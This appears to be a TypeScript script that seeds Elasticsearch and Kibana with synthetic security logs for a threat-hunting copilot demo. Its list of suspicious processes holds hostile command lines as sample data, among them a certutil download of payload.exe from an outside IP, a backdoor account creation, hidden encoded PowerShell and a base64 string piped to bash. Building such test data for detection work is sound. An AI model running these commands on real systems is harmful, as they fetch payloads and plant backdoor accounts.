/**
 * generate-logs.ts — Demo Elasticsearch log seeder for Query Copilot.
 *
 * Generates three realistic, ECS-shaped synthetic security log datasets and
 * indexes them into Elasticsearch, then (optionally) creates matching Kibana
 * data views so analysts can immediately hunt with the copilot in Discover.
 *
 *   - logs-auth-demo     (~1000 docs)  authentication events (ssh login success/failure,
 *                                      with planted brute-force clusters)
 *   - logs-process-demo  (~500 docs)   process start events (mostly benign, with a
 *                                      minority of suspicious commands)
 *   - logs-network-demo  (~300 docs)   network flow events (mostly normal ports, with
 *                                      a minority on unusual/suspicious ports)
 *
 * PREREQUISITES
 *   A running Elasticsearch + Kibana (the plugin's dev stack), with credentials.
 *
 * ENV VARS
 *   ES_URL              Elasticsearch URL          (default http://localhost:9200)
 *   ES_USERNAME         ES basic-auth username     (e.g. elastic)
 *   ES_PASSWORD         ES basic-auth password
 *   ES_API_KEY          ES API key (alternative to ES_USERNAME/ES_PASSWORD)
 *   KIBANA_URL          Kibana URL                 (default http://localhost:5601)
 *   KIBANA_USERNAME     Kibana basic-auth username (defaults to ES_USERNAME)
 *   KIBANA_PASSWORD     Kibana basic-auth password (defaults to ES_PASSWORD)
 *
 * CLI FLAGS
 *   --clean       Delete the demo indices (+ matching data views) before seeding.
 *   --no-kibana   Skip Kibana data-view creation (ES indexing only).
 *
 * RUN (from the plugin dir)
 *   ES_USERNAME=elastic ES_PASSWORD=changeme \
 *     npx ts-node scripts/seed/generate-logs.ts --clean
 *
 * NOTE: This is a normal standalone Node script (NOT a Workflow sandbox), so the
 * use of `Date` and `Math.random` for synthetic data generation is intentional
 * and fine here.
 */

import * as fs from 'fs';
import * as path from 'path';
import { Client } from '@elastic/elasticsearch';

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

export interface TimeWindow {
  /** Inclusive start of the window (ms epoch). */
  startMs: number;
  /** Inclusive end of the window (ms epoch). */
  endMs: number;
}

export interface SeedConfig {
  esUrl: string;
  esUsername?: string;
  esPassword?: string;
  esApiKey?: string;
  kibanaUrl: string;
  kibanaUsername?: string;
  kibanaPassword?: string;
  clean: boolean;
  noKibana: boolean;
}

export interface AuthDoc {
  '@timestamp': string;
  event: {
    category: 'authentication';
    dataset: 'system.auth';
    action: 'ssh_login_failed' | 'ssh_login_success';
    outcome: 'failure' | 'success';
  };
  source: { ip: string; port: number };
  user: { name: string };
  host: { name: string; hostname: string };
  message: string;
}

export interface ProcessDoc {
  '@timestamp': string;
  event: {
    category: 'process';
    type: 'start';
    action: 'process_started';
    dataset: 'system.process';
  };
  process: {
    name: string;
    command_line: string;
    pid: number;
    parent: { name: string };
  };
  user: { name: string };
  host: { name: string };
}

export interface NetworkDoc {
  '@timestamp': string;
  event: {
    category: 'network';
    dataset: 'system.network';
  };
  network: {
    direction: 'inbound' | 'outbound';
    transport: 'tcp' | 'udp';
    bytes: number;
  };
  source: { ip: string; port: number };
  destination: { ip: string; port: number };
  host: { name: string };
}

interface IndexTemplate {
  name: string;
  body: Record<string, unknown>;
}

interface IndexTemplatesFile {
  templates: IndexTemplate[];
}

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------

export const AUTH_INDEX = 'logs-auth-demo';
export const PROCESS_INDEX = 'logs-process-demo';
export const NETWORK_INDEX = 'logs-network-demo';
export const DEMO_INDICES = [AUTH_INDEX, PROCESS_INDEX, NETWORK_INDEX] as const;

export const AUTH_VOLUME = 1000;
export const PROCESS_VOLUME = 500;
export const NETWORK_VOLUME = 300;

const DAY_MS = 24 * 60 * 60 * 1000;

const USER_NAMES = [
  'root',
  'admin',
  'administrator',
  'jdoe',
  'asmith',
  'mwilson',
  'svc_backup',
  'svc_deploy',
  'ec2-user',
  'ubuntu',
  'postgres',
  'www-data',
  'guest',
];

const HOST_NAMES = [
  'web-prod-01',
  'web-prod-02',
  'db-prod-01',
  'db-prod-02',
  'edge-gw-01',
  'ad-dc-01',
  'bastion-01',
  'app-stg-01',
  'cache-prod-01',
  'mail-prod-01',
];

const BENIGN_PROCESSES: Array<{ name: string; parent: string; cmd: (pid: number) => string }> = [
  { name: 'bash', parent: 'sshd', cmd: () => '/bin/bash' },
  { name: 'sshd', parent: 'systemd', cmd: (pid) => `/usr/sbin/sshd -D -R [listener] ${pid}` },
  { name: 'node', parent: 'systemd', cmd: () => '/usr/bin/node /opt/app/server.js' },
  { name: 'python3', parent: 'cron', cmd: () => '/usr/bin/python3 /opt/jobs/sync.py' },
  { name: 'nginx', parent: 'systemd', cmd: () => 'nginx: worker process' },
  { name: 'systemd', parent: 'systemd', cmd: () => '/lib/systemd/systemd --user' },
  { name: 'postgres', parent: 'systemd', cmd: () => 'postgres: checkpointer' },
  { name: 'curl', parent: 'bash', cmd: () => 'curl -s https://repo.internal/health' },
  { name: 'java', parent: 'systemd', cmd: () => '/usr/bin/java -jar /opt/app/service.jar' },
  { name: 'cron', parent: 'systemd', cmd: () => '/usr/sbin/cron -f' },
];

const SUSPICIOUS_PROCESSES: Array<{ name: string; parent: string; cmd: (pid: number) => string }> = [
  {
    name: 'powershell.exe',
    parent: 'cmd.exe',
    cmd: () =>
      'powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA',
  },
  {
    name: 'powershell.exe',
    parent: 'explorer.exe',
    cmd: () =>
      'powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAA=',
  },
  {
    name: 'cmd.exe',
    parent: 'powershell.exe',
    cmd: () => 'cmd.exe /c "whoami /priv & net localgroup administrators"',
  },
  {
    name: 'certutil.exe',
    parent: 'cmd.exe',
    cmd: () => 'certutil -urlcache -split -f http://185.220.101.45/payload.exe payload.exe',
  },
  {
    name: 'whoami.exe',
    parent: 'cmd.exe',
    cmd: () => 'whoami /priv',
  },
  {
    name: 'net.exe',
    parent: 'cmd.exe',
    cmd: () => 'net user backdoor P@ssw0rd123 /add',
  },
  {
    name: 'bash',
    parent: 'sshd',
    cmd: () =>
      "bash -c 'echo ZWNobyBoYWNrZWQ7IGN1cmwgaHR0cDovLzE5Mi4wLjIuMQ== | base64 -d | bash'",
  },
];

const NORMAL_PORTS = [443, 80, 53, 22, 3306, 5601, 9200, 8443, 123];
const SUSPICIOUS_PORTS = [4444, 1337, 31337, 8888, 6667, 9001];

// ---------------------------------------------------------------------------
// Small random helpers (fine for a normal Node script)
// ---------------------------------------------------------------------------

function randInt(minInclusive: number, maxInclusive: number): number {
  return Math.floor(Math.random() * (maxInclusive - minInclusive + 1)) + minInclusive;
}

function pick<T>(arr: readonly T[]): T {
  return arr[randInt(0, arr.length - 1)];
}

function chance(probability: number): boolean {
  return Math.random() < probability;
}

function randomTimestampInWindow(window: TimeWindow): number {
  return randInt(window.startMs, window.endMs);
}

/** Internal RFC1918 IP — mostly 10.0.x.x, plus some 172.16.x.x and 192.168.x.x. */
export function internalIp(): string {
  const roll = Math.random();
  if (roll < 0.7) {
    return `10.0.${randInt(0, 255)}.${randInt(1, 254)}`;
  }
  if (roll < 0.85) {
    return `172.16.${randInt(0, 255)}.${randInt(1, 254)}`;
  }
  return `192.168.${randInt(0, 255)}.${randInt(1, 254)}`;
}

/** Routable public IPv4, avoiding private / reserved ranges. */
export function externalIp(): string {
  // First octet kept in a clearly-public range, avoiding 10/172.16-31/192.168/127/0.
  const publicFirstOctets = [185, 203, 45, 92, 198, 51, 104, 209, 77, 188, 5, 80];
  const first = pick(publicFirstOctets);
  return `${first}.${randInt(0, 255)}.${randInt(0, 255)}.${randInt(1, 254)}`;
}

// ---------------------------------------------------------------------------
// Pure generators (no I/O — deterministically testable on properties)
// ---------------------------------------------------------------------------

export function generateAuthEvents(count: number, window: TimeWindow): AuthDoc[] {
  const docs: AuthDoc[] = [];

  // Reserve a slice of the volume for planted brute-force clusters so the demo
  // always contains a clear, huntable signal.
  const clusterCount = Math.min(3, Math.max(1, Math.floor(count / 300)));
  const reservedPerCluster = Math.min(40, Math.floor(count * 0.04));
  const reserved = clusterCount * reservedPerCluster;
  const normalCount = Math.max(0, count - reserved);

  // --- Normal / baseline traffic ---
  for (let i = 0; i < normalCount; i++) {
    const isFailure = chance(0.6); // ~60% failures
    // A meaningful share of source IPs are external.
    const ip = chance(0.4) ? externalIp() : internalIp();
    const user = pick(USER_NAMES);
    const host = pick(HOST_NAMES);
    const action = isFailure ? 'ssh_login_failed' : 'ssh_login_success';
    docs.push({
      '@timestamp': new Date(randomTimestampInWindow(window)).toISOString(),
      event: {
        category: 'authentication',
        dataset: 'system.auth',
        action,
        outcome: isFailure ? 'failure' : 'success',
      },
      source: { ip, port: randInt(1024, 65535) },
      user: { name: user },
      host: { name: host, hostname: host },
      message: isFailure
        ? `Failed password for ${user} from ${ip} port`
        : `Accepted password for ${user} from ${ip} port`,
    });
  }

  // --- Planted brute-force clusters: one external IP hammering ssh_login_failed
  // against a single user/host inside a short time burst. ---
  for (let c = 0; c < clusterCount; c++) {
    const attackerIp = externalIp();
    const targetUser = pick(USER_NAMES);
    const targetHost = pick(HOST_NAMES);
    // A short burst window (~5 minutes) somewhere inside the overall window.
    const burstStart = randInt(window.startMs, Math.max(window.startMs, window.endMs - 5 * 60 * 1000));
    for (let i = 0; i < reservedPerCluster; i++) {
      // The vast majority fail; a single success at the end simulates a breach.
      const success = i === reservedPerCluster - 1;
      docs.push({
        '@timestamp': new Date(burstStart + i * randInt(1000, 4000)).toISOString(),
        event: {
          category: 'authentication',
          dataset: 'system.auth',
          action: success ? 'ssh_login_success' : 'ssh_login_failed',
          outcome: success ? 'success' : 'failure',
        },
        source: { ip: attackerIp, port: randInt(1024, 65535) },
        user: { name: targetUser },
        host: { name: targetHost, hostname: targetHost },
        message: success
          ? `Accepted password for ${targetUser} from ${attackerIp} port`
          : `Failed password for ${targetUser} from ${attackerIp} port`,
      });
    }
  }

  return docs;
}

export function generateProcessEvents(count: number, window: TimeWindow): ProcessDoc[] {
  const docs: ProcessDoc[] = [];
  for (let i = 0; i < count; i++) {
    const suspicious = chance(0.1); // ~10% suspicious
    const template = suspicious ? pick(SUSPICIOUS_PROCESSES) : pick(BENIGN_PROCESSES);
    const pid = randInt(100, 65000);
    docs.push({
      '@timestamp': new Date(randomTimestampInWindow(window)).toISOString(),
      event: {
        category: 'process',
        type: 'start',
        action: 'process_started',
        dataset: 'system.process',
      },
      process: {
        name: template.name,
        command_line: template.cmd(pid),
        pid,
        parent: { name: template.parent },
      },
      user: { name: pick(USER_NAMES) },
      host: { name: pick(HOST_NAMES) },
    });
  }
  return docs;
}

export function generateNetworkEvents(count: number, window: TimeWindow): NetworkDoc[] {
  const docs: NetworkDoc[] = [];
  for (let i = 0; i < count; i++) {
    const unusual = chance(0.12); // ~12% on unusual ports
    const direction: 'inbound' | 'outbound' = unusual
      ? 'outbound' // unusual ports lean outbound (beaconing / exfil flavor)
      : chance(0.5)
      ? 'inbound'
      : 'outbound';
    const destPort = unusual ? pick(SUSPICIOUS_PORTS) : pick(NORMAL_PORTS);
    // Unusual/outbound flows carry larger byte counts to look like exfil.
    const bytes = unusual ? randInt(500_000, 50_000_000) : randInt(64, 200_000);
    docs.push({
      '@timestamp': new Date(randomTimestampInWindow(window)).toISOString(),
      event: {
        category: 'network',
        dataset: 'system.network',
      },
      network: {
        direction,
        transport: destPort === 53 ? 'udp' : chance(0.1) ? 'udp' : 'tcp',
        bytes,
      },
      source: {
        ip: direction === 'outbound' ? internalIp() : externalIp(),
        port: randInt(1024, 65535),
      },
      destination: {
        ip: direction === 'outbound' ? externalIp() : internalIp(),
        port: destPort,
      },
      host: { name: pick(HOST_NAMES) },
    });
  }
  return docs;
}

// ---------------------------------------------------------------------------
// Config / window builders
// ---------------------------------------------------------------------------

export function buildTimeWindow(now: number = Date.now()): TimeWindow {
  return { startMs: now - 7 * DAY_MS, endMs: now };
}

export function buildConfigFromEnv(
  env: NodeJS.ProcessEnv = process.env,
  argv: string[] = process.argv.slice(2)
): SeedConfig {
  return {
    esUrl: env.ES_URL ?? 'http://localhost:9200',
    esUsername: env.ES_USERNAME,
    esPassword: env.ES_PASSWORD,
    esApiKey: env.ES_API_KEY,
    kibanaUrl: env.KIBANA_URL ?? 'http://localhost:5601',
    kibanaUsername: env.KIBANA_USERNAME ?? env.ES_USERNAME,
    kibanaPassword: env.KIBANA_PASSWORD ?? env.ES_PASSWORD,
    clean: argv.includes('--clean'),
    noKibana: argv.includes('--no-kibana'),
  };
}

// ---------------------------------------------------------------------------
// Side-effectful runner (guarded so importing this module is pure)
// ---------------------------------------------------------------------------

function buildEsClient(config: SeedConfig): Client {
  if (config.esApiKey) {
    return new Client({ node: config.esUrl, auth: { apiKey: config.esApiKey } });
  }
  if (config.esUsername && config.esPassword) {
    return new Client({
      node: config.esUrl,
      auth: { username: config.esUsername, password: config.esPassword },
    });
  }
  return new Client({ node: config.esUrl });
}

function loadIndexTemplates(): IndexTemplatesFile {
  const file = path.join(__dirname, 'index-templates.json');
  const raw = fs.readFileSync(file, 'utf8');
  const parsed = JSON.parse(raw) as unknown;
  if (
    typeof parsed !== 'object' ||
    parsed === null ||
    !Array.isArray((parsed as { templates?: unknown }).templates)
  ) {
    throw new Error('index-templates.json must contain a "templates" array');
  }
  return parsed as IndexTemplatesFile;
}

function kibanaAuthHeader(config: SeedConfig): string | undefined {
  const user = config.kibanaUsername;
  const pass = config.kibanaPassword;
  if (user && pass) {
    return 'Basic ' + Buffer.from(`${user}:${pass}`).toString('base64');
  }
  return undefined;
}

async function deleteDataView(config: SeedConfig, indexTitle: string): Promise<void> {
  const auth = kibanaAuthHeader(config);
  const headers: Record<string, string> = {
    'kbn-xsrf': 'true',
    'Content-Type': 'application/json',
  };
  if (auth) {
    headers.Authorization = auth;
  }
  // Look up the data view id by title, then delete it.
  const findRes = await fetch(`${config.kibanaUrl}/api/data_views`, { headers });
  if (!findRes.ok) {
    return;
  }
  const body = (await findRes.json()) as { data_view?: Array<{ id: string; title: string }> };
  const matches = (body.data_view ?? []).filter((dv) => dv.title === indexTitle);
  for (const dv of matches) {
    await fetch(`${config.kibanaUrl}/api/data_views/data_view/${dv.id}`, {
      method: 'DELETE',
      headers,
    });
    console.log(`  deleted data view "${indexTitle}" (${dv.id})`);
  }
}

async function createDataView(
  config: SeedConfig,
  indexTitle: string,
  friendlyName: string
): Promise<void> {
  const auth = kibanaAuthHeader(config);
  const headers: Record<string, string> = {
    'kbn-xsrf': 'true',
    'Content-Type': 'application/json',
  };
  if (auth) {
    headers.Authorization = auth;
  }
  const res = await fetch(`${config.kibanaUrl}/api/data_views/data_view`, {
    method: 'POST',
    headers,
    body: JSON.stringify({
      data_view: {
        title: indexTitle,
        name: friendlyName,
        timeFieldName: '@timestamp',
      },
    }),
  });
  if (res.ok) {
    console.log(`  created data view "${friendlyName}" (${indexTitle})`);
    return;
  }
  const text = await res.text();
  if (res.status === 400 && /already exists|Duplicate/i.test(text)) {
    console.log(`  data view "${indexTitle}" already exists — skipping`);
    return;
  }
  console.warn(`  WARN: failed to create data view "${indexTitle}": ${res.status} ${text}`);
}

async function bulkIndex(client: Client, index: string, docs: unknown[]): Promise<void> {
  if (docs.length === 0) {
    return;
  }
  const operations: unknown[] = [];
  for (const doc of docs) {
    operations.push({ index: { _index: index } });
    operations.push(doc);
  }
  const resp = await client.bulk({ refresh: true, operations });
  if (resp.errors) {
    const firstError = resp.items.find((item) => item.index && item.index.error);
    throw new Error(
      `Bulk indexing into ${index} reported errors: ${JSON.stringify(firstError?.index?.error)}`
    );
  }
  console.log(`  indexed ${docs.length} docs into ${index}`);
}

async function main(): Promise<void> {
  const config = buildConfigFromEnv();
  const window = buildTimeWindow();
  const client = buildEsClient(config);

  console.log(`Seeding demo logs into ${config.esUrl}`);

  if (config.clean) {
    console.log('Cleaning existing demo indices...');
    for (const index of DEMO_INDICES) {
      await client.indices.delete({ index }, { ignore: [404] });
      console.log(`  deleted index ${index} (if it existed)`);
    }
    if (!config.noKibana) {
      console.log('Cleaning existing demo data views...');
      for (const index of DEMO_INDICES) {
        await deleteDataView(config, index);
      }
    }
  }

  // Apply index templates.
  const { templates } = loadIndexTemplates();
  for (const tmpl of templates) {
    await client.indices.putIndexTemplate({
      name: tmpl.name,
      ...(tmpl.body as object),
    } as Parameters<typeof client.indices.putIndexTemplate>[0]);
    console.log(`  applied index template ${tmpl.name}`);
  }

  // Generate + index.
  const authDocs = generateAuthEvents(AUTH_VOLUME, window);
  const processDocs = generateProcessEvents(PROCESS_VOLUME, window);
  const networkDocs = generateNetworkEvents(NETWORK_VOLUME, window);

  await bulkIndex(client, AUTH_INDEX, authDocs);
  await bulkIndex(client, PROCESS_INDEX, processDocs);
  await bulkIndex(client, NETWORK_INDEX, networkDocs);

  // Create Kibana data views.
  if (!config.noKibana) {
    console.log('Creating Kibana data views...');
    await createDataView(config, AUTH_INDEX, 'Demo: Auth Logs');
    await createDataView(config, PROCESS_INDEX, 'Demo: Process Logs');
    await createDataView(config, NETWORK_INDEX, 'Demo: Network Logs');
  } else {
    console.log('Skipping Kibana data-view creation (--no-kibana).');
  }

  console.log('Done. Summary:');
  console.log(`  ${AUTH_INDEX}:    ${authDocs.length} docs`);
  console.log(`  ${PROCESS_INDEX}: ${processDocs.length} docs`);
  console.log(`  ${NETWORK_INDEX}: ${networkDocs.length} docs`);
}

if (require.main === module) {
  main().catch((err) => {
    console.error('Seeding failed:', err);
    process.exitCode = 1;
  });
}
